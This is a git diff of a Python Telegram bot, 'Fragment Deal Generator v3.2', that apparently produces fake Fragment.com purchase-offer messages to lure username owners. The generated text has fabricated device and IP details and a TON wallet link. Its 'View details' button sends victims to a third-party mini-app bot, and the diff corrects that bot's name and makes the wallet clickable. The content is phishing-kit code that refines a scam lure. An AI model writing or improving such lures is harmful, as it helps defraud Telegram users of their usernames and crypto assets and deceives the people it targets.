@@ -15,7 +15,7 @@ FIXED_CHAT_ID = 511758924
 PORT = int(os.getenv('PORT', 10000))
 WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
 
-print(f"🤖 Fragment Deal Generator v3.1 - WEBHOOK FIXED")
+print(f"🤖 Fragment Deal Generator v3.2 - WEBHOOK FIXED")
 print(f"🔑 Token: ✅")
 print(f"🎯 Chat ID: {FIXED_CHAT_ID}")
 print(f"🌐 Port: {PORT}")
@@ -46,7 +46,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = update.effective_user
         chat_id = update.effective_chat.id
         
-        message = f"""🤖 **Fragment Deal Generator v3.1**
+        message = f"""🤖 **Fragment Deal Generator v3.2**
 
 Hello {user.first_name}! 👋
 
@@ -107,7 +107,7 @@ async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         price_usd = price * ton_price
         commission_usd = commission * ton_price
         
-        # Message Fragment avec corrections
+        # Message Fragment avec wallet cliquable et montants corrigés
         fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
 
 • Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
@@ -118,24 +118,35 @@ Please note that a 5% commission is charged to the seller prior to accepting the
 Additional Information:
 • Device: Safari on macOS  
 • IP Address: 103.56.72.245
-• Wallet: [EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U)
+• Wallet: EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U
 
 Important:
 • Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
 • If you choose not to proceed, simply ignore this message."""
         
-        # URL du bouton avec format correct
-        button_url = f"https://t.me/BidRequestMiniApp_bot/WebApp?startapp={username.lower()}-{price:g}"
+        # URL du bouton avec le BON nom de bot
+        button_url = f"https://t.me/BidRequestWebApp_bot/WebApp?startapp={username.lower()}-{price:g}"
         
         # Bouton avec URL corrigée
         keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        # Envoi du message
+        # Envoi du message avec entités pour le lien wallet
+        wallet_address = "EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U"
+        
         await update.message.reply_text(
             fragment_message,
             reply_markup=reply_markup,
-            disable_web_page_preview=True
+            disable_web_page_preview=True,
+            parse_mode=None,  # Pas de Markdown pour éviter les conflits
+            entities=[
+                {
+                    "type": "text_link",
+                    "offset": fragment_message.find(wallet_address),
+                    "length": len(wallet_address),
+                    "url": f"https://tonviewer.com/{wallet_address}"
+                }
+            ] if fragment_message.find(wallet_address) != -1 else None
         )
         
         # Message de confirmation
@@ -243,10 +254,10 @@ class WebhookHandler(BaseHTTPRequestHandler):
 </head>
 <body>
     <div class="container">
-        <h1>🤖 Fragment Deal Generator v3.1</h1>
+        <h1>🤖 Fragment Deal Generator v3.2</h1>
         <p class="status">✅ Status: {bot_status}</p>
         <div class="info">
-            <p><strong>🔗 Bot:</strong> @BidRequestMiniApp_bot</p>
+            <p><strong>🔗 Bot:</strong> @BidRequestWebApp_bot</p>
             <p><strong>📡 Mode:</strong> Webhook</p>
             <p><strong>🌐 System:</strong> Render Cloud</p>
             <p><strong>🕐 Time:</strong> {time.strftime('%Y-%m-%d %H:%M:%S UTC')}</p>
@@ -259,7 +270,7 @@ class WebhookHandler(BaseHTTPRequestHandler):
         <ul>
             <li>✅ TON amounts without "TON" text</li>
             <li>✅ Clickable wallet link</li>
-            <li>✅ Correct WebApp button URL</li>
+            <li>✅ Correct WebApp button URL (BidRequestWebApp_bot)</li>
             <li>✅ Real-time TON price</li>
         </ul>
     </div>
@@ -440,7 +451,7 @@ def run_server():
 # ===== MAIN =====
 def main():
     """Point d'entrée principal"""
-    print("🚀 Starting Fragment Deal Generator v3.1...")
+    print("🚀 Starting Fragment Deal Generator v3.2...")
     print("=" * 60)
     
     try:
